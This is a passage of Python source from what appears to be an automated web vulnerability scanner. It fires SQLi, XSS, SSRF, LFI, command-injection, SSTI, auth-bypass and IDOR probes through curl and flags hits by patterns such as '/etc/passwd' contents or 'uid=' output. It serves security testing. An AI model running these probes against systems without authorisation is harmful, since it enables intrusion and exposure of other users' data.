                    findings.append({
                        "type": "Prototype Pollution",
                        "url": url,
                        "payload": payload,
                        "severity": "high",
                        "evidence": f"POST with prototype pollution payload returned {pr['status']}",
                        "description": "Potential prototype pollution via JSON input",
                        "confidence": 0.3,
                        "cvss_score": 7.5,
                        "source_tool": "hunt",
                    })

        return findings, test_names

    # ─── Helper Methods ──────────────────────────────────────────

    def _prioritize_urls(self, urls: list, surface: dict, target: str) -> list:
        scored = []
        api_endpoints = set(surface.get("api_endpoints", []))
        admin_panels = set(surface.get("admin_panels", []))

        for url in urls:
            score = 0
            parsed = urlparse(url)
            if url in api_endpoints:
                score += 10
            if url in admin_panels:
                score += 8
            if parsed.query:
                qs = parse_qs(parsed.query)
                score += min(len(qs) * 3, 15)
                for p in qs:
                    if p.lower() in ("id", "user_id", "uid", "file", "url", "redirect", "page",
                                      "next", "doc", "path", "img", "src", "load", "fetch"):
                        score += 5
            if any(m in url for m in (".php", ".asp", ".aspx", ".jsp", ".do", ".action", ".api")):
                score += 3
            if "/api/" in url or "/v1/" in url or "/v2/" in url:
                score += 4
            scored.append((score, url))

        scored.sort(key=lambda x: x[0], reverse=True)
        return [u for _, u in scored]

    async def _make_request(self, url: str, method: str = "GET",
                            headers: dict = None, data: str = None,
                            timeout: int = 5) -> dict:
        cmd = ["curl", "-s", "-L", "-i", "--max-time", str(timeout)]
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        if method == "POST":
            cmd.extend(["-X", "POST"])
            if data:
                cmd.extend(["--data", data])
        elif method == "PUT":
            cmd.extend(["-X", "PUT"])
            if data:
                cmd.extend(["--data", data])
        elif method == "DELETE":
            cmd.extend(["-X", "DELETE"])
        elif method == "PATCH":
            cmd.extend(["-X", "PATCH"])
        elif method == "HEAD":
            cmd.extend(["-X", "HEAD"])
        cmd.append(url)

        result = await self.tools.run("curl", cmd[1:])
        return {
            "raw": result.get("stdout", ""),
            "success": result.get("success", False),
            "error": result.get("error"),
        }

    def _parse_response(self, raw: str) -> dict:
        parts = raw.split("\r\n\r\n", 1)
        headers_raw = parts[0] if parts else ""
        body = parts[1] if len(parts) > 1 else ""

        status_match = re.search(r"HTTP/\d\.\d\s+(\d+)", headers_raw)
        status = int(status_match.group(1)) if status_match else 0

        headers = {}
        for line in headers_raw.split("\n")[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()

        return {"status": status, "headers": headers, "body": body[:5000]}

    def _xss_reflected(self, payload: str, body: str) -> bool:
        """Check if XSS payload is reflected (even with partial encoding)."""
        if payload in body:
            return True
        # Check for partial reflection
        if "<script>" in payload and "<script>" in body.lower():
            return True
        if "alert" in payload and "alert" in body:
            return True
        return False

    def _looks_defended(self, findings: list) -> bool:
        """Check if responses suggest a defended target."""
        blocked_count = sum(1 for f in findings
                          if any(w in f.get("evidence", "").lower()
                                for w in ("403", "blocked", "forbidden", "rate limit", "captcha")))
        return blocked_count > 3

    def _classify_bypass(self, payload: str) -> str:
        """Classify what bypass technique was used."""
        if "%00" in payload or "\\x00" in payload:
            return "null_byte"
        if "/**/" in payload or "/*" in payload:
            return "comment_injection"
        if "%" in payload and any(c.isalpha() for c in payload):
            return "url_encoding"
        if "&#x" in payload or "&#" in payload:
            return "html_encoding"
        if payload != payload.lower() and payload != payload.upper():
            return "case_mixing"
        if "\\u" in payload:
            return "unicode_encoding"
        if "atob" in payload or "fromCharCode" in payload:
            return "eval_encoding"
        if "`" in payload or "$(" in payload:
            return "shell_syntax"
        return "mutation"

    def _deduplicate_findings(self, findings: list) -> list:
        """Deduplicate findings by type + endpoint + param."""
        seen = set()
        unique = []
        for f in findings:
            key = (f.get("type", ""), f.get("url", ""), f.get("param", ""))
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique

    # ─── Standard Vuln Tests (Originals) ─────────────────────────

    async def _hunt_idor(self, urls: list, target: str) -> Tuple[list, list]:
        findings = []
        test_names = ["idor"]

        # Phase 1: Standard numeric ID IDOR
        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if "id" in params or "user_id" in params or "uid" in params or "file_id" in params:
                for param_name in ("id", "user_id", "uid", "file_id"):
                    if param_name not in params:
                        continue
                    original_val = params[param_name][0]
                    if original_val.isdigit():
                        test_ids = ["1", "2", "99999", "0", "-1"]
                        for tid in test_ids[:3]:
                            new_params = dict(params)
                            new_params[param_name] = [tid]
                            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                            resp = await self._make_request(test_url)
                            pr = self._parse_response(resp["raw"])

                            if pr["status"] == 200 and pr["body"] and tid != original_val:
                                analysis = await self._analyze_idor_finding(url, param_name, original_val, tid, pr)
                                if analysis.get("is_vulnerable"):
                                    findings.append({
                                        "type": "IDOR",
                                        "url": test_url,
                                        "param": param_name,
                                        "original_value": original_val,
                                        "test_value": tid,
                                        "severity": "high",
                                        "evidence": pr["body"][:500],
                                        "description": analysis.get("description", f"IDOR in {param_name}"),
                                        "confidence": analysis.get("confidence", 0.7),
                                        "cvss_score": 6.5,
                                        "source_tool": "hunt",
                                    })
                                    break

        # Phase 2: Email-based IDOR with temp emails
        email_findings = await self._hunt_idor_email(urls, target)
        findings.extend(email_findings)
        if email_findings:
            test_names.append("idor_email")

        return findings, test_names

    async def _hunt_idor_email(self, urls: list, target: str) -> list:
        """
        Email-based IDOR testing using temp emails.

        Creates temp email addresses, then tests if email parameters
        can be manipulated to access other users' data.
        """
        findings = []

        # Find email-related endpoints
        email_endpoints = []
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param_name in params:
                if any(k in param_name.lower() for k in ("email", "mail", "e", "user", "account")):
                    email_endpoints.append((url, param_name, params))
                    break

        if not email_endpoints:
            return findings

        # Create temp emails for testing
        temp = TempEmail()
        try:
            accounts = await temp.create_multiple(3)
            if len(accounts) < 2:
                return findings

            for url, param_name, params in email_endpoints[:3]:
                original_email = params[param_name][0]
                test_emails = [a["email"] for a in accounts if a["email"] != original_email]

                for test_email in test_emails[:2]:
                    new_params = dict(params)
                    new_params[param_name] = [test_email]
                    parsed = urlparse(url)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"

                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])

                    # Check if we got data for a different user
                    if pr["status"] == 200 and pr["body"]:
                        body_lower = pr["body"].lower()
                        # Look for user data indicators
                        has_user_data = any(ind in body_lower for ind in (
                            "profile", "account", "user", "email", "name",
                            "phone", "address", "settings", "dashboard",
                        ))
                        has_error = any(ind in body_lower for ind in (
                            "not found", "unauthorized", "forbidden", "error", "invalid",
                        ))

                        if has_user_data and not has_error:
                            findings.append({
                                "type": "IDOR (Email)",
                                "url": test_url,
                                "param": param_name,
                                "original_value": original_email,
                                "test_value": test_email,
                                "severity": "critical",
                                "evidence": f"Email manipulation returned user data: {pr['body'][:300]}",
                                "description": f"IDOR via email parameter — accessed other user's data",
                                "confidence": 0.75,
                                "cvss_score": 7.5,
                                "source_tool": "hunt-email-idor",
                                "temp_emails_used": [original_email, test_email],
                            })
                            break
        except Exception:
            pass
        finally:
            await temp.close()

        return findings

    async def _hunt_ssrf(self, urls: list) -> Tuple[list, list]:
        findings = []
        test_names = ["ssrf"]

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name, values in params.items():
                param_lower = param_name.lower()
                if any(k in param_lower for k in ("url", "uri", "file", "path", "dest", "redirect", "loc",
                                                    "source", "load", "fetch", "image", "img", "href", "src")):
                    for payload in self.tools.payloads.SSRF[:3]:
                        new_params = dict(params)
                        new_params[param_name] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                        resp = await self._make_request(test_url)
                        pr = self._parse_response(resp["raw"])

                        if pr["status"] in (200, 301, 302) or payload in pr["body"]:
                            findings.append({
                                "type": "SSRF",
                                "url": test_url,
                                "param": param_name,
                                "payload": payload,
                                "severity": "critical",
                                "evidence": f"Status: {pr['status']}, Body: {pr['body'][:200]}",
                                "description": f"SSRF via {param_name}",
                                "confidence": 0.6,
                                "cvss_score": 8.6,
                                "source_tool": "hunt",
                            })
                            break

        return findings, test_names

    async def _hunt_xss(self, urls: list) -> Tuple[list, list]:
        findings = []
        test_names = ["xss"]

        for url in urls[:8]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                # Get baseline response first
                baseline_resp = await self._make_request(url)
                baseline = self._parse_response(baseline_resp["raw"])
                baseline_data = {
                    "status": baseline["status"],
                    "body": baseline["body"],
                    "headers": baseline["headers"],
                }

                for payload in self.tools.payloads.XSS[:4]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])
                    
                    exploit_data = {
                        "status": pr["status"],
                        "body": pr["body"],
                        "headers": pr["headers"],
                    }

                    if payload in pr["body"] and pr["headers"].get("content-type", "").startswith("text/html"):
                        finding = {
                            "type": "XSS",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "high",
                            "description": f"Reflected XSS in {param_name}",
                            "confidence": 0.8,
                            "cvss_score": 6.1,
                            "source_tool": "hunt",
                        }
                        
                        # Enrich with evidence collector
                        finding = self.evidence_collector.enrich_finding(
                            finding=finding,
                            url=test_url,
                            param=param_name,
                            payload=payload,
                            baseline_response=baseline_data,
                            exploit_response=exploit_data,
                            evidence_context=f"Payload reflected in HTML response",
                            server_side_proof="Payload reflects in HTML without encoding",
                        )
                        findings.append(finding)
                        break

        return findings, test_names

    async def _hunt_sqli(self, urls: list) -> Tuple[list, list]:
        findings = []
        test_names = ["sqli"]

        for url in urls[:8]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                # Get baseline response first
                baseline_resp = await self._make_request(url)
                baseline = self._parse_response(baseline_resp["raw"])
                baseline_data = {
                    "status": baseline["status"],
                    "body": baseline["body"],
                    "headers": baseline["headers"],
                }

                for payload in self.tools.payloads.SQLI[:5]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])
                    
                    exploit_data = {
                        "status": pr["status"],
                        "body": pr["body"],
                        "headers": pr["headers"],
                    }

                    # Check for SQL errors
                    sql_errors = ("sql", "mysql", "syntax", "unclosed", "quotation", "odbc",
                                  "postgresql", "ORA-", "SQLite", "MariaDB")
                    has_error = any(err in pr["body"].lower() for err in sql_errors)
                    
                    if has_error:
                        finding = {
                            "type": "SQLi",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "critical",
                            "description": f"SQLi in {param_name} — error leaked",
                            "confidence": 0.9,
                            "cvss_score": 9.8,
                            "source_tool": "hunt",
                        }
                        
                        # Enrich with evidence collector
                        finding = self.evidence_collector.enrich_finding(
                            finding=finding,
                            url=test_url,
                            param=param_name,
                            payload=payload,
                            baseline_response=baseline_data,
                            exploit_response=exploit_data,
                            evidence_context=pr["body"][:500],
                            server_side_proof="SQL error message indicates server-side query processing",
                        )
                        findings.append(finding)
                        break
                    
                    # Check for significant response size change (blind SQLi)
                    baseline_len = len(baseline["body"])
                    if abs(len(pr["body"]) - baseline_len) > 200 and baseline["status"] == pr["status"]:
                        finding = {
                            "type": "SQLi (Blind)",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "critical",
                            "description": f"Potential blind SQLi in {param_name} — response size changed",
                            "confidence": 0.6,
                            "cvss_score": 9.8,
                            "source_tool": "hunt",
                        }
                        
                        # Enrich with evidence collector
                        finding = self.evidence_collector.enrich_finding(
                            finding=finding,
                            url=test_url,
                            param=param_name,
                            payload=payload,
                            baseline_response=baseline_data,
                            exploit_response=exploit_data,
                            evidence_context=f"Baseline: {baseline_len}B, Test: {len(pr['body'])}B",
                            server_side_proof="Response size difference indicates server-side query processing",
                        )
                        findings.append(finding)
                        break

        return findings, test_names

    async def _hunt_auth_bypass(self, urls: list) -> Tuple[list, list]:
        findings = []
        test_names = ["auth_bypass"]

        for url in urls[:5]:
            for bypass in self.tools.payloads.AUTH_BYPASS:
                header_name, header_value = bypass["header"].split(": ", 1)
                resp = await self._make_request(url, headers={header_name: header_value})
                pr = self._parse_response(resp["raw"])

                if pr["status"] == 200 and pr["body"] and len(pr["body"]) > 100:
                    findings.append({
                        "type": "Auth Bypass",
                        "url": url,
                        "header": bypass["header"],
                        "severity": "critical",
                        "evidence": f"Status: {pr['status']}, Body: {len(pr['body'])}B",
                        "description": f"Auth bypass via {bypass['header']}",
                        "confidence": 0.5,
                        "cvss_score": 9.8,
                        "source_tool": "hunt",
                    })

        return findings, test_names

    async def _hunt_ssti(self, urls: list) -> Tuple[list, list]:
        findings = []
        test_names = ["ssti"]

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in self.tools.payloads.SSTI[:5]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])

                    # Check for evaluation proof with context validation
                    expected = "49"
                    idx = pr["body"].find(expected)
                    if idx >= 0:
                        # Verify it's actual SSTI, not just random "49" in page
                        # Check that payload brackets are NOT just echoed back
                        start = max(0, idx - 50)
                        end = min(len(pr["body"]), idx + len(expected) + 50)
                        context = pr["body"][start:end]
# Reject if the raw payload template is echoed (reflection ≠ evaluation)
                        if "{{7*7}}" in context or "${7*7}" in context or "<%= 7*7 %>" in context:
                            continue
                        findings.append({
                            "type": "SSTI",
                            "url": test_url,
                            "endpoint": test_url,
                            "param": param_name,
                            "parameter": param_name,
                            "payload": payload,
                            "severity": "critical",
                            "evidence": f"SSTI evaluation confirmed: {context.replace(chr(10), ' ').replace(chr(13), '')[:300]}",
                            "description": f"SSTI in {param_name} — arithmetic evaluation proven",
                            "confidence": 0.85,
                            "cvss_score": 9.8,
                            "source_tool": "hunt",
                            "status_code": pr["status"],
                            "evaluation_proof": expected,
                            "response_context": context,
                            "tested_url": test_url,
                            "http_request": f"GET {test_url} HTTP/1.1\nHost: {parsed.netloc}\nUser-Agent: Mozilla/5.0\nAccept: */*",
                            "http_response": f"HTTP/1.1 {pr['status']}\nContent-Type: text/html\n\n{context.replace(chr(10), ' ').replace(chr(13), '')[:500]}",
                        })
                        break

        return findings, test_names

    async def _hunt_open_redirect(self, urls: list) -> Tuple[list, list]:
        findings = []
        test_names = ["open_redirect"]

        redirect_params = ["url", "redirect", "next", "return", "destination", "dest", "goto", "target", "to", "link", "page"]

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() not in redirect_params:
                    continue
                for payload in self.tools.payloads.OPEN_REDIRECT[:3]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])

                    if pr["status"] in (301, 302, 303, 307, 308):
                        loc = pr["headers"].get("location", "")
                        if "evil.com" in loc or "@" in loc or "//" == loc[:2]:
                            findings.append({
                                "type": "Open Redirect",
                                "url": test_url,
                                "param": param_name,
                                "payload": payload,
                                "severity": "medium",
                                "evidence": f"Redirect to: {loc}",
                                "description": f"Open redirect via {param_name}",
                                "confidence": 0.9,
                                "cvss_score": 4.3,
                                "source_tool": "hunt",
                            })
                            break

        return findings, test_names

    async def _hunt_lfi(self, urls: list) -> Tuple[list, list]:
        findings = []
        test_names = ["lfi"]

        file_params = ["file", "page", "doc", "path", "include", "template", "root", "load"]

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() not in file_params:
                    continue
                for payload in self.tools.payloads.LFI[:2]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])

                    if "root:" in pr["body"] or "daemon:" in pr["body"]:
                        findings.append({
                            "type": "LFI",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "high",
                            "evidence": f"/etc/passwd content: {pr['body'][:500]}",
                            "description": f"LFI via {param_name}",
                            "confidence": 0.95,
                            "cvss_score": 7.5,
                            "source_tool": "hunt",
                        })
                        break

        return findings, test_names

    async def _hunt_command_injection(self, urls: list) -> Tuple[list, list]:
        findings = []
        test_names = ["command_injection"]

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in self.tools.payloads.COMMAND_INJECTION[:3]:
                    new_params = dict(params)
                    new_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                    resp = await self._make_request(test_url)
                    pr = self._parse_response(resp["raw"])

                    if any(x in pr["body"] for x in ("uid=", "root:", "bin/", "total ")):
                        findings.append({
                            "type": "Command Injection",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "severity": "critical",
                            "evidence": f"Command output: {pr['body'][:500]}",
                            "description": f"Command injection in {param_name}",
                            "confidence": 0.9,
                            "cvss_score": 9.8,
                            "source_tool": "hunt",
                        })
                        break

        return findings, test_names

    async def _hunt_nosqli(self, urls: list) -> Tuple[list, list]:
        findings = []
        test_names = ["nosqli"]

        for url in urls[:3]:
            for payload in self.tools.payloads.NOSQLI[:2]:
                resp = await self._make_request(url, method="POST", data=payload,
                                                headers={"Content-Type": "application/json"})
                pr = self._parse_response(resp["raw"])
                if pr["status"] == 200 and pr["body"]:
                    findings.append({
                        "type": "NoSQLi",
                        "url": url,
                        "payload": payload,
                        "severity": "high",
                        "evidence": f"POST returned {pr['status']}: {pr['body'][:200]}",
                        "description": "Potential NoSQL injection",
                        "confidence": 0.4,
                        "cvss_score": 7.5,
                        "source_tool": "hunt",
                    })

        return findings, test_names

    async def _hunt_graphql(self, urls: list) -> Tuple[list, list]:
        findings = []
        test_names = ["graphql"]

        gql_urls = [u for u in urls if "/graphql" in u or "/gql" in u]
        if not gql_urls:
            gql_urls = [u.rstrip("/") + "/graphql" for u in urls[:3]]

        for gql_url in gql_urls[:3]:
            for payload in self.tools.payloads.GRAPHQL[:2]:
                resp = await self._make_request(gql_url, method="POST", data=payload,
                                                headers={"Content-Type": "application/json"})
                pr = self._parse_response(resp["raw"])
                if pr["status"] == 200 and pr["body"]:
                    if "__schema" in pr["body"] or "types" in pr["body"]:
                        findings.append({
                            "type": "GraphQL Introspection",
                            "url": gql_url,
                            "severity": "medium",
                            "evidence": f"Schema exposed: {pr['body'][:500]}",
                            "description": "GraphQL introspection enabled",
                            "confidence": 1.0,
                            "cvss_score": 5.3,
                            "source_tool": "hunt",
                        })
                        break

        return findings, test_names

    # ─── LLM Analysis ────────────────────────────────────────────

    async def _analyze_idor_finding(self, url, param, original, test, response):
        prompt = f"""Analyze IDOR: {url} | {param}: {original}->{test} | Status: {response['status']} | Body: {response['body'][:500]}
Return JSON: {{"is_vulnerable": true/false, "description": "...", "confidence": 0.0-1.0}}"""
        try:
            result = await self.llm_analyze(prompt)
            return json.loads(result) if result.strip().startswith("{") else {"is_vulnerable": False}
        except (json.JSONDecodeError, ValueError):
            return {"is_vulnerable": False}

    async def _analyze_sqli_finding(self, url, param, payload, response):
        prompt = f"""Analyze SQLi: {url} | {param} | Payload: {payload} | Status: {response['status']} | Body: {response['body'][:500]}
Return JSON: {{"is_vulnerable": true/false, "description": "...", "confidence": 0.0-1.0}}"""
        try:
            result = await self.llm_analyze(prompt)
            return json.loads(result) if result.strip().startswith("{") else {"is_vulnerable": False}
        except (json.JSONDecodeError, ValueError):
            return {"is_vulnerable": False}

    def _inject_knowledge_payloads(self, knowledge: list, vuln_type: str, target: str):
        """Inject payloads from disclosed reports into the payload database."""
        extra = {"ssrf": [], "xss": [], "sqli": [], "idor": []}

        for report in knowledge:
            payload = report.get("payload", "")
            cls = report.get("vulnerability_class", "").lower()

            if cls == "ssrf" and payload:
                extra["ssrf"].append(payload)
            elif cls == "xss" and payload:
                extra["xss"].append(payload)
            elif cls == "sqli" and payload:
                extra["sqli"].append(payload)

        if extra["ssrf"]:
            self.tools.payloads.SSRF = list(set(self.tools.payloads.SSRF + extra["ssrf"]))
        if extra["xss"]:
            self.tools.payloads.XSS = list(set(self.tools.payloads.XSS + extra["xss"]))
        if extra["sqli"]:
            self.tools.payloads.SQLI = list(set(self.tools.payloads.SQLI + extra["sqli"]))
